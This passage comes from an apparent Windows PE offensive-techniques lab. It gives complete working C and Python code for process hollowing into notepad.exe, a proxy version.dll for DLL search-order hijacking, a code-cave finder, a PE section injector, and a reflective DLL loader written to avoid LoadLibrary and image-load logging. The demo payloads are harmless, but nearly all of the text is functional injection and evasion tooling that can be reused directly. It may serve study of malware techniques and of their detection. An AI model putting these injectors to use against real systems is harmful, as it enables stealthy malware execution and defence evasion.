   - Or use ScyllaHide plugin to automatically hide debugger presence.

4. Patch NtGlobalFlag:
   - Find PEB + 0xBC, zero the flag bits 0x70
   - ScyllaHide handles this automatically.

5. For timing checks: use hardware breakpoints (don't modify code bytes)
   and minimize single-stepping through the timing region.
```

**Verification:** Run clean → "No debugger". Run in x64dbg without ScyllaHide → "Debugger detected". Run in x64dbg with ScyllaHide → "No debugger".

---

### Exercise 4: Process Hollowing

**Objective:** Implement the process hollowing technique: create a suspended legitimate process, unmap its image, map a payload PE in its place, and resume execution. Understand every PE structure interaction in the process.

#### Step 1: Create a payload binary

```c
/* C:\PELab\payloads\hollow_payload.c — the binary that will be injected */
#include <windows.h>
#include <stdio.h>

int main(void) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char msg[512];
    snprintf(msg, sizeof(msg),
             "HOLLOWED! Running inside: %s\n"
             "PID: %lu\n"
             "This proves the host process image was replaced.",
             path, GetCurrentProcessId());
    MessageBoxA(NULL, msg, "Process Hollowing Success", MB_OK);
    return 0;
}
```

```powershell
cl.exe /Fe:C:\PELab\payloads\hollow_payload.exe C:\PELab\payloads\hollow_payload.c user32.lib
```

#### Step 2: Implement the hollowing engine

```c
/* C:\PELab\payloads\hollower.c
 * Process hollowing implementation.
 * Authorized lab/research use only.
 */
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

BOOL HollowProcess(const wchar_t *hostPath, const char *payloadPath) {
    /* Read payload PE from disk */
    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open payload: %lu\n", GetLastError());
        return FALSE;
    }
    DWORD payloadSize = GetFileSize(hFile, NULL);
    LPVOID payloadBuf = VirtualAlloc(NULL, payloadSize,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_READWRITE);
    DWORD bytesRead;
    ReadFile(hFile, payloadBuf, payloadSize, &bytesRead, NULL);
    CloseHandle(hFile);

    printf("[+] Payload loaded: %lu bytes\n", payloadSize);

    /* Parse payload PE headers */
    PIMAGE_DOS_HEADER payloadDos = (PIMAGE_DOS_HEADER)payloadBuf;
    if (payloadDos->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid payload DOS signature\n");
        return FALSE;
    }
    PIMAGE_NT_HEADERS64 payloadNt = (PIMAGE_NT_HEADERS64)
        ((PBYTE)payloadBuf + payloadDos->e_lfanew);
    if (payloadNt->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Invalid payload PE signature\n");
        return FALSE;
    }

    printf("[+] Payload EP RVA    : 0x%08X\n",
           payloadNt->OptionalHeader.AddressOfEntryPoint);
    printf("[+] Payload ImageBase : 0x%016llX\n",
           payloadNt->OptionalHeader.ImageBase);
    printf("[+] Payload SizeOfImage: 0x%X\n",
           payloadNt->OptionalHeader.SizeOfImage);

    /* Create host process SUSPENDED */
    STARTUPINFOW si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessW(hostPath, NULL, NULL, NULL, FALSE,
                         CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessW failed: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Host process created (PID %lu) in SUSPENDED state\n",
           pi.dwProcessId);

    /* Read host's PEB to get ImageBase */
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[-] GetThreadContext failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }

    ULONGLONG hostImageBase = 0;
    /* PEB.ImageBaseAddress is at PEB + 0x10 on x64 */
    ReadProcessMemory(pi.hProcess, (PBYTE)ctx.Rdx + 0x10,
                      &hostImageBase, sizeof(ULONGLONG), NULL);
    printf("[+] Host ImageBase    : 0x%016llX\n", hostImageBase);

    /* Unmap the host's image */
    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                       "NtUnmapViewOfSection");
    NTSTATUS status = NtUnmap(pi.hProcess, (PVOID)hostImageBase);
    printf("[+] NtUnmapViewOfSection: 0x%08X\n", status);

    /* Allocate memory at the host's original ImageBase */
    LPVOID remoteBase = VirtualAllocEx(pi.hProcess,
        (LPVOID)payloadNt->OptionalHeader.ImageBase,
        payloadNt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteBase) {
        printf("[!] Allocation at preferred base failed, trying any address\n");
        remoteBase = VirtualAllocEx(pi.hProcess, NULL,
            payloadNt->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!remoteBase) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    printf("[+] Allocated remote memory at: 0x%p\n", remoteBase);

    /* Write PE headers */
    WriteProcessMemory(pi.hProcess, remoteBase, payloadBuf,
                       payloadNt->OptionalHeader.SizeOfHeaders, NULL);

    /* Write each section */
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(payloadNt);
    for (WORD i = 0; i < payloadNt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData == 0) continue;
        BOOL ok = WriteProcessMemory(pi.hProcess,
            (PBYTE)remoteBase + sec[i].VirtualAddress,
            (PBYTE)payloadBuf + sec[i].PointerToRawData,
            sec[i].SizeOfRawData, NULL);
        printf("[+] Wrote section %-8.8s at RVA 0x%08X (%lu bytes) %s\n",
               sec[i].Name, sec[i].VirtualAddress,
               sec[i].SizeOfRawData, ok ? "OK" : "FAIL");
    }

    /* Apply base relocations if loaded at different address */
    ULONGLONG delta = (ULONGLONG)remoteBase -
                      payloadNt->OptionalHeader.ImageBase;
    if (delta != 0) {
        printf("[+] Relocation delta: 0x%llX\n", delta);
        DWORD relocRVA = payloadNt->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        DWORD relocSize = payloadNt->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

        if (relocRVA && relocSize) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)
                ((PBYTE)payloadBuf + relocRVA);
            PBYTE relocEnd = (PBYTE)reloc + relocSize;

            while ((PBYTE)reloc < relocEnd && reloc->SizeOfBlock) {
                DWORD numEntries = (reloc->SizeOfBlock - 8) / 2;
                PWORD entries = (PWORD)((PBYTE)reloc + 8);

                for (DWORD j = 0; j < numEntries; j++) {
                    WORD type = entries[j] >> 12;
                    WORD offset = entries[j] & 0x0FFF;

                    if (type == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG *patchAddr = (ULONGLONG *)
                            ((PBYTE)payloadBuf + reloc->VirtualAddress + offset);
                        *patchAddr += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD *patchAddr = (DWORD *)
                            ((PBYTE)payloadBuf + reloc->VirtualAddress + offset);
                        *patchAddr += (DWORD)delta;
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)
                    ((PBYTE)reloc + reloc->SizeOfBlock);
            }
            /* Rewrite the relocated sections */
            for (WORD i = 0; i < payloadNt->FileHeader.NumberOfSections; i++) {
                if (sec[i].SizeOfRawData == 0) continue;
                WriteProcessMemory(pi.hProcess,
                    (PBYTE)remoteBase + sec[i].VirtualAddress,
                    (PBYTE)payloadBuf + sec[i].PointerToRawData,
                    sec[i].SizeOfRawData, NULL);
            }
            printf("[+] Base relocations applied\n");
        }
    }

    /* Update PEB.ImageBaseAddress */
    WriteProcessMemory(pi.hProcess, (PBYTE)ctx.Rdx + 0x10,
                       &remoteBase, sizeof(ULONGLONG), NULL);

    /* Set the new entry point */
    ctx.Rcx = (DWORD64)remoteBase +
              payloadNt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    printf("[+] Entry point set to: 0x%016llX\n", ctx.Rcx);

    /* Resume the process */
    ResumeThread(pi.hThread);
    printf("[+] Process resumed — hollowing complete\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    VirtualFree(payloadBuf, 0, MEM_RELEASE);
    return TRUE;
}

int main(void) {
    printf("=== Process Hollowing Lab ===\n\n");

    /* Use notepad.exe as the host process */
    const wchar_t *host = L"C:\\Windows\\System32\\notepad.exe";
    const char *payload = "C:\\PELab\\payloads\\hollow_payload.exe";

    if (HollowProcess(host, payload)) {
        printf("\n[+] SUCCESS: notepad.exe is now running our payload\n");
    } else {
        printf("\n[-] FAILED\n");
    }
    return 0;
}
```

#### Step 3: Build and execute

```powershell
cl.exe /Fe:C:\PELab\payloads\hollower.exe C:\PELab\payloads\hollower.c ntdll.lib

# Run as Administrator
C:\PELab\payloads\hollower.exe
```

**Expected output:**

```
=== Process Hollowing Lab ===

[+] Payload loaded: 12288 bytes
[+] Payload EP RVA    : 0x00001000
[+] Payload ImageBase : 0x0000000140000000
[+] Host process created (PID 5432) in SUSPENDED state
[+] Host ImageBase    : 0x00007FF7ABCD0000
[+] NtUnmapViewOfSection: 0x00000000
[+] Allocated remote memory at: 0x0000000140000000
[+] Wrote section .text    at RVA 0x00001000 (4096 bytes) OK
[+] Wrote section .rdata   at RVA 0x00002000 (2048 bytes) OK
[+] Wrote section .data    at RVA 0x00003000 (512 bytes) OK
[+] Entry point set to: 0x0000000140001000
[+] Process resumed — hollowing complete

[+] SUCCESS: notepad.exe is now running our payload
```

A MessageBox appears from `notepad.exe`'s PID showing the hollowed payload message.

**Verification:** Open Task Manager — you'll see `notepad.exe` running, but its behavior is entirely replaced. Use Process Explorer to compare the on-disk image path vs. the in-memory code.

---

### Exercise 5: DLL Search Order Hijacking

**Objective:** Exploit the Windows DLL search order to execute code via a phantom DLL. Discover hijackable DLLs, create a proxy DLL, and achieve code execution through a legitimate signed application.

#### Step 1: Discover phantom DLLs

```python
#!/usr/bin/env python3
"""C:\PELab\tools\find_hijackable.py
Find DLLs imported by a PE that are NOT in KnownDLLs and not in System32.
"""
import pefile
import os
import sys

# KnownDLLs list (common subset — full list from registry on Windows)
KNOWN_DLLS = {
    'kernel32.dll', 'ntdll.dll', 'user32.dll', 'gdi32.dll',
    'advapi32.dll', 'shell32.dll', 'ole32.dll', 'oleaut32.dll',
    'comdlg32.dll', 'comctl32.dll', 'msvcrt.dll', 'rpcrt4.dll',
    'sechost.dll', 'kernelbase.dll', 'bcryptprimitives.dll',
    'ucrtbase.dll', 'ws2_32.dll', 'crypt32.dll', 'msasn1.dll',
    'cfgmgr32.dll', 'clbcatq.dll', 'difxapi.dll', 'gdiplus.dll',
    'iertutil.dll', 'imagehlp.dll', 'imm32.dll', 'normaliz.dll',
    'nsi.dll', 'psapi.dll', 'setupapi.dll', 'shlwapi.dll',
    'urlmon.dll', 'winhttp.dll', 'wininet.dll', 'wldap32.dll',
    'wow64.dll', 'wow64cpu.dll', 'wow64win.dll',
}

SYSTEM32 = os.path.join(os.environ.get('SystemRoot', r'C:\Windows'), 'System32')

def find_hijackable(pe_path):
    pe = pefile.PE(pe_path)
    if not hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        print("No imports found.")
        pe.close()
        return []

    results = []
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        dll_name = entry.dll.decode('utf-8', errors='replace').lower()
        in_known = dll_name in KNOWN_DLLS
        in_sys32 = os.path.exists(os.path.join(SYSTEM32, dll_name))

        funcs = []
        for imp in entry.imports:
            if imp.name:
                funcs.append(imp.name.decode('utf-8', errors='replace'))
            else:
                funcs.append(f"Ordinal#{imp.ordinal}")

        if not in_known:
            risk = "HIGH" if not in_sys32 else "MEDIUM"
            results.append({
                'dll': dll_name,
                'known': in_known,
                'in_sys32': in_sys32,
                'risk': risk,
                'functions': funcs
            })

    pe.close()

    print(f"\nHijackable DLL Analysis for: {pe_path}")
    print(f"{'DLL':<30} {'KnownDLLs':>10} {'System32':>10} {'Risk':>6} {'Functions'}")
    print("-" * 100)

    for r in sorted(results, key=lambda x: x['risk']):
        func_preview = ', '.join(r['functions'][:3])
        if len(r['functions']) > 3:
            func_preview += f" (+{len(r['functions'])-3} more)"
        print(f"  {r['dll']:<28} {'YES' if r['known'] else 'NO':>10} "
              f"{'YES' if r['in_sys32'] else 'NO':>10} {r['risk']:>6} "
              f"{func_preview}")

    return results

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <pe_file>")
        sys.exit(1)
    find_hijackable(sys.argv[1])
```

#### Step 2: Create a proxy DLL

```c
/* C:\PELab\payloads\version_proxy.c
 * Proxy DLL for version.dll — forwards all exports to the real DLL
 * while executing our payload on DLL_PROCESS_ATTACH.
 *
 * This demonstrates DLL side-loading / search order hijacking.
 */
#include <windows.h>
#include <stdio.h>

/* Load the real version.dll from System32 */
static HMODULE hRealVersion = NULL;

/* Export forwarding macros — each exported function loads the real
 * DLL and forwards the call */
#define PROXY_FUNC(name) \
    __declspec(dllexport) FARPROC WINAPI name() { \
        if (!hRealVersion) { \
            char sys32[MAX_PATH]; \
            GetSystemDirectoryA(sys32, MAX_PATH); \
            strcat_s(sys32, MAX_PATH, "\\version.dll"); \
            hRealVersion = LoadLibraryA(sys32); \
        } \
        return GetProcAddress(hRealVersion, #name); \
    }

/* version.dll exports (common ones) */
PROXY_FUNC(GetFileVersionInfoA)
PROXY_FUNC(GetFileVersionInfoW)
PROXY_FUNC(GetFileVersionInfoSizeA)
PROXY_FUNC(GetFileVersionInfoSizeW)
PROXY_FUNC(VerQueryValueA)
PROXY_FUNC(VerQueryValueW)
PROXY_FUNC(GetFileVersionInfoExA)
PROXY_FUNC(GetFileVersionInfoExW)
PROXY_FUNC(GetFileVersionInfoSizeExA)
PROXY_FUNC(GetFileVersionInfoSizeExW)
PROXY_FUNC(VerFindFileA)
PROXY_FUNC(VerFindFileW)
PROXY_FUNC(VerInstallFileA)
PROXY_FUNC(VerInstallFileW)
PROXY_FUNC(VerLanguageNameA)
PROXY_FUNC(VerLanguageNameW)

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        /* === PAYLOAD EXECUTION POINT === */
        FILE *f = fopen("C:\\PELab\\output\\dll_hijack_log.txt", "a");
        if (f) {
            char parentPath[MAX_PATH];
            GetModuleFileNameA(NULL, parentPath, MAX_PATH);
            fprintf(f, "[DLL HIJACK] version.dll loaded by: %s (PID %lu)\n",
                    parentPath, GetCurrentProcessId());
            fclose(f);
        }

        /* Load the real DLL for forwarding */
        char sys32path[MAX_PATH];
        GetSystemDirectoryA(sys32path, MAX_PATH);
        strcat_s(sys32path, MAX_PATH, "\\version.dll");
        hRealVersion = LoadLibraryA(sys32path);
    }
    else if (reason == DLL_PROCESS_DETACH) {
        if (hRealVersion) FreeLibrary(hRealVersion);
    }
    return TRUE;
}
```

#### Step 3: Build and deploy

```powershell
# Build the proxy DLL
cl.exe /LD /Fe:C:\PELab\payloads\version.dll C:\PELab\payloads\version_proxy.c /link /DEF:version.def

# Create a .def file listing exports
@"
LIBRARY version
EXPORTS
    GetFileVersionInfoA
    GetFileVersionInfoW
    GetFileVersionInfoSizeA
    GetFileVersionInfoSizeW
    VerQueryValueA
    VerQueryValueW
    GetFileVersionInfoExA
    GetFileVersionInfoExW
    GetFileVersionInfoSizeExA
    GetFileVersionInfoSizeExW
    VerFindFileA
    VerFindFileW
    VerInstallFileA
    VerInstallFileW
    VerLanguageNameA
    VerLanguageNameW
"@ | Out-File -FilePath C:\PELab\payloads\version.def -Encoding ascii

# Copy a target app that loads version.dll to a writeable directory
mkdir C:\PELab\hijack_test -Force
Copy-Item C:\Windows\System32\notepad.exe C:\PELab\hijack_test\
Copy-Item C:\PELab\payloads\version.dll C:\PELab\hijack_test\

# Run notepad from the hijack directory
C:\PELab\hijack_test\notepad.exe
```

**Expected result:** `C:\PELab\output\dll_hijack_log.txt` shows the hijack log entry. Notepad functions normally because all version.dll calls are proxied to the real DLL.

**Verification:** Check the log file. Use Process Monitor to see `version.dll` loaded from `C:\PELab\hijack_test\` instead of `System32`.

---

### Exercise 6: PE Section Injection and Code Caves

**Objective:** Add a new section to an existing PE binary containing shellcode, redirect execution through it, and find existing code caves for stealthier injection.

#### Step 1: Code cave finder

```python
#!/usr/bin/env python3
"""C:\PELab\tools\cave_finder.py
Find code caves (runs of null bytes) within PE sections.
"""
import pefile
import sys

MIN_CAVE = 64

def find_caves(path):
    pe = pefile.PE(path)
    print(f"Code Cave Analysis: {path}\n")

    total_caves = 0
    for sec in pe.sections:
        name = sec.Name.rstrip(b'\x00').decode('utf-8', errors='replace')
        if sec.SizeOfRawData == 0:
            continue

        data = sec.get_data()
        caves = []
        cave_start = None
        cave_len = 0

        for i, b in enumerate(data):
            if b == 0x00:
                if cave_start is None:
                    cave_start = i
                cave_len += 1
            else:
                if cave_len >= MIN_CAVE:
                    file_off = sec.PointerToRawData + cave_start
                    rva = sec.VirtualAddress + cave_start
                    caves.append((file_off, rva, cave_len))
                cave_start = None
                cave_len = 0

        if cave_len >= MIN_CAVE:
            file_off = sec.PointerToRawData + cave_start
            rva = sec.VirtualAddress + cave_start
            caves.append((file_off, rva, cave_len))

        if caves:
            perms = []
            if sec.Characteristics & 0x20000000: perms.append("X")
            if sec.Characteristics & 0x40000000: perms.append("R")
            if sec.Characteristics & 0x80000000: perms.append("W")
            print(f"Section: {name} ({''.join(perms)})")
            for foff, rva, clen in caves:
                usable = "USABLE (executable)" if "X" in perms else "non-exec"
                print(f"  Cave: file=0x{foff:08X}  RVA=0x{rva:08X}  "
                      f"size={clen:5d} bytes  [{usable}]")
                total_caves += 1
            print()

    print(f"Total caves >= {MIN_CAVE} bytes: {total_caves}")
    pe.close()

if __name__ == '__main__':
    find_caves(sys.argv[1])
```

#### Step 2: Section injection tool

```python
#!/usr/bin/env python3
"""C:\PELab\tools\section_injector.py
Add a new executable section to a PE file with shellcode payload.
"""
import pefile
import struct
import sys
import os
import math

def add_section(pe_path, output_path, section_name, shellcode):
    """Add a new section containing shellcode to a PE file."""
    with open(pe_path, 'rb') as f:
        data = bytearray(f.read())

    pe = pefile.PE(data=bytes(data))

    # Alignment values
    file_align = pe.OPTIONAL_HEADER.FileAlignment
    sect_align = pe.OPTIONAL_HEADER.SectionAlignment

    def align(val, alignment):
        return ((val + alignment - 1) // alignment) * alignment

    # Find space for new section header
    last_section = pe.sections[-1]
    new_header_offset = (
        pe.sections[-1].get_file_offset() + 40  # sizeof(IMAGE_SECTION_HEADER)
    )

    # Check if there's room in the header area
    headers_end = pe.OPTIONAL_HEADER.SizeOfHeaders
    if new_header_offset + 40 > headers_end:
        print("[-] No room for new section header in PE headers")
        print(f"    Header space available: {headers_end - new_header_offset} bytes")
        return False

    # Calculate new section parameters
    new_va = align(
        last_section.VirtualAddress + last_section.Misc_VirtualSize,
        sect_align
    )
    new_raw_offset = align(
        last_section.PointerToRawData + last_section.SizeOfRawData,
        file_align
    )
    new_raw_size = align(len(shellcode), file_align)
    new_virt_size = len(shellcode)

    # Section characteristics: RX (code, readable, executable)
    characteristics = (
        0x00000020 |  # IMAGE_SCN_CNT_CODE
        0x20000000 |  # IMAGE_SCN_MEM_EXECUTE
        0x40000000    # IMAGE_SCN_MEM_READ
    )

    # Build the section header
    name_bytes = section_name.encode('utf-8')[:8].ljust(8, b'\x00')
    section_header = struct.pack('<8s I I I I I I H H I',
        name_bytes,
        new_virt_size,      # VirtualSize
        new_va,             # VirtualAddress
        new_raw_size,       # SizeOfRawData
        new_raw_offset,     # PointerToRawData
        0,                  # PointerToRelocations
        0,                  # PointerToLinenumbers
        0,                  # NumberOfRelocations
        0,                  # NumberOfLinenumbers
        characteristics
    )

    # Patch the file
    # 1. Increment NumberOfSections
    num_sections_offset = pe.FILE_HEADER.get_file_offset() + 2
    old_count = struct.unpack_from('<H', data, num_sections_offset)[0]
    struct.pack_into('<H', data, num_sections_offset, old_count + 1)

    # 2. Write the section header
    data[new_header_offset:new_header_offset + 40] = section_header

    # 3. Update SizeOfImage
    new_size_of_image = align(new_va + new_virt_size, sect_align)
    size_image_offset = pe.OPTIONAL_HEADER.get_file_offset() + 56
    struct.pack_into('<I', data, size_image_offset, new_size_of_image)

    # 4. Append shellcode data (padded to FileAlignment)
    padded_shellcode = shellcode + b'\x00' * (new_raw_size - len(shellcode))

    # Extend file to the raw offset if needed
    if len(data) < new_raw_offset:
        data.extend(b'\x00' * (new_raw_offset - len(data)))

    data[new_raw_offset:new_raw_offset] = padded_shellcode

    # Write output
    with open(output_path, 'wb') as f:
        f.write(data)

    pe.close()

    print(f"[+] New section '{section_name}' added:")
    print(f"    VirtualAddress : 0x{new_va:08X}")
    print(f"    VirtualSize    : 0x{new_virt_size:X}")
    print(f"    RawDataOffset  : 0x{new_raw_offset:08X}")
    print(f"    RawDataSize    : 0x{new_raw_size:X}")
    print(f"    Characteristics: 0x{characteristics:08X}")
    print(f"    SizeOfImage    : 0x{new_size_of_image:X}")
    print(f"[+] Output: {output_path}")

    return True

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <input_pe> <output_pe> [section_name]")
        sys.exit(1)

    # Example shellcode: MessageBoxA("Injected!", "Section Injection", MB_OK)
    # This is a stub — replace with your generated shellcode for lab testing
    # Using INT3 breakpoint sled as placeholder
    shellcode = b'\xCC' * 64  # INT3 sled for demonstration

    section_name = sys.argv[3] if len(sys.argv) > 3 else '.inject'
    add_section(sys.argv[1], sys.argv[2], section_name, shellcode)

if __name__ == '__main__':
    main()
```

**Verification:** Run `dumpbin /headers` on the modified PE to confirm the new section appears with correct RVA, size, and characteristics.

---

### Exercise 7: Reflective DLL Injection

**Objective:** Implement a DLL that can load itself into a remote process without touching disk or calling `LoadLibrary`, bypassing module-list enumeration and image-load event logging.

#### Step 1: Build the reflective loader

```c
/* C:\PELab\payloads\reflective_dll.c
 * Self-loading DLL: contains a reflective loader stub that
 * performs manual PE mapping when called from injected memory.
 *
 * Based on the Stephen Fewer technique.
 * Authorized lab use only.
 */
#include <windows.h>
#include <winternl.h>

/* Minimal PEB walking to resolve kernel32 base */
typedef struct _LDR_MODULE {
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID BaseAddress;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_MODULE, *PLDR_MODULE;

/* Hash-based API resolution (avoid string comparison in shellcode) */
static DWORD hash_api(const char *name) {
    DWORD h = 0;
    while (*name) {
        h = ((h >> 13) | (h << 19)) + (BYTE)*name++;
    }
    return h;
}

/* The reflective loader: called when the DLL is already in memory
 * (written by the injector). It maps itself properly. */
__declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter) {
    /* Step 1: Find our own base address by scanning backwards
     * from the current instruction pointer for 'MZ' */
    ULONG_PTR uiLibraryAddress = (ULONG_PTR)ReflectiveLoader;

    /* Align down to page boundary and scan */
    uiLibraryAddress &= ~0xFFF;
    while (TRUE) {
        if (*(WORD *)uiLibraryAddress == IMAGE_DOS_SIGNATURE) {
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)
                (uiLibraryAddress +
                 ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE)
                break;
        }
        uiLibraryAddress -= 0x1000;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)uiLibraryAddress;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)
        (uiLibraryAddress + dos->e_lfanew);

    /* Step 2: Find kernel32.dll via PEB */
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    HMODULE hKernel32 = NULL;
    while (entry != head) {
        PLDR_MODULE mod = CONTAINING_RECORD(entry, LDR_MODULE,
                                             InMemoryOrderModuleList);
        /* Check for kernel32.dll by name length and first chars */
        if (mod->BaseDllName.Length == 24) {  /* "kernel32.dll" in Unicode */
            WCHAR *name = mod->BaseDllName.Buffer;
            if ((name[0] | 0x20) == 'k' && (name[1] | 0x20) == 'e') {
                hKernel32 = (HMODULE)mod->BaseAddress;
                break;
            }
        }
        entry = entry->Flink;
    }

    if (!hKernel32) return 0;

    /* Step 3: Resolve LoadLibraryA, GetProcAddress, VirtualAlloc,
     * VirtualProtect from kernel32's export table */
    typedef HMODULE (WINAPI *fnLoadLibraryA)(LPCSTR);
    typedef FARPROC (WINAPI *fnGetProcAddress)(HMODULE, LPCSTR);
    typedef LPVOID  (WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL    (WINAPI *fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

    fnLoadLibraryA pLoadLibraryA = NULL;
    fnGetProcAddress pGetProcAddress = NULL;
    fnVirtualAlloc pVirtualAlloc = NULL;
    fnVirtualProtect pVirtualProtect = NULL;

    /* Walk kernel32 exports */
    PIMAGE_DOS_HEADER k32dos = (PIMAGE_DOS_HEADER)hKernel32;
    PIMAGE_NT_HEADERS64 k32nt = (PIMAGE_NT_HEADERS64)
        ((PBYTE)hKernel32 + k32dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)
        ((PBYTE)hKernel32 + k32nt->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD *names = (DWORD *)((PBYTE)hKernel32 + exports->AddressOfNames);
    WORD *ordinals = (WORD *)((PBYTE)hKernel32 + exports->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)((PBYTE)hKernel32 + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char *fname = (const char *)((PBYTE)hKernel32 + names[i]);
        DWORD h = hash_api(fname);

        if (h == hash_api("LoadLibraryA"))
            pLoadLibraryA = (fnLoadLibraryA)((PBYTE)hKernel32 + funcs[ordinals[i]]);
        else if (h == hash_api("GetProcAddress"))
            pGetProcAddress = (fnGetProcAddress)((PBYTE)hKernel32 + funcs[ordinals[i]]);
        else if (h == hash_api("VirtualAlloc"))
            pVirtualAlloc = (fnVirtualAlloc)((PBYTE)hKernel32 + funcs[ordinals[i]]);
        else if (h == hash_api("VirtualProtect"))
            pVirtualProtect = (fnVirtualProtect)((PBYTE)hKernel32 + funcs[ordinals[i]]);
    }

    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc)
        return 0;

    /* Step 4: Allocate memory for the properly-mapped image */
    LPVOID baseAddr = pVirtualAlloc(NULL,
        nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!baseAddr) return 0;

    /* Step 5: Copy headers */
    for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
        ((PBYTE)baseAddr)[i] = ((PBYTE)uiLibraryAddress)[i];

    /* Step 6: Map sections */
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData == 0) continue;
        PBYTE dest = (PBYTE)baseAddr + sec[i].VirtualAddress;
        PBYTE src = (PBYTE)uiLibraryAddress + sec[i].PointerToRawData;
        for (DWORD j = 0; j < sec[i].SizeOfRawData; j++)
            dest[j] = src[j];
    }

    /* Step 7: Process relocations */
    ULONGLONG delta = (ULONGLONG)baseAddr - nt->OptionalHeader.ImageBase;
    if (delta != 0) {
        DWORD relocRVA = nt->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        if (relocRVA) {
            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)
                ((PBYTE)baseAddr + relocRVA);
            DWORD relocSize = nt->OptionalHeader.DataDirectory[
                IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

            while (reloc->SizeOfBlock &&
                   (PBYTE)reloc < (PBYTE)baseAddr + relocRVA + relocSize) {
                DWORD nEntries = (reloc->SizeOfBlock - 8) / 2;
                WORD *entries = (WORD *)((PBYTE)reloc + 8);
                for (DWORD j = 0; j < nEntries; j++) {
                    WORD type = entries[j] >> 12;
                    WORD offset = entries[j] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        *(ULONGLONG *)((PBYTE)baseAddr +
                            reloc->VirtualAddress + offset) += delta;
                    }
                }
                reloc = (PIMAGE_BASE_RELOCATION)
                    ((PBYTE)reloc + reloc->SizeOfBlock);
            }
        }
    }

    /* Step 8: Resolve imports */
    DWORD importRVA = nt->OptionalHeader.DataDirectory[
        IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (importRVA) {
        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)
            ((PBYTE)baseAddr + importRVA);
        for (; imp->Name; imp++) {
            HMODULE hDll = pLoadLibraryA(
                (LPCSTR)((PBYTE)baseAddr + imp->Name));
            if (!hDll) continue;

            PIMAGE_THUNK_DATA64 origThunk = (PIMAGE_THUNK_DATA64)
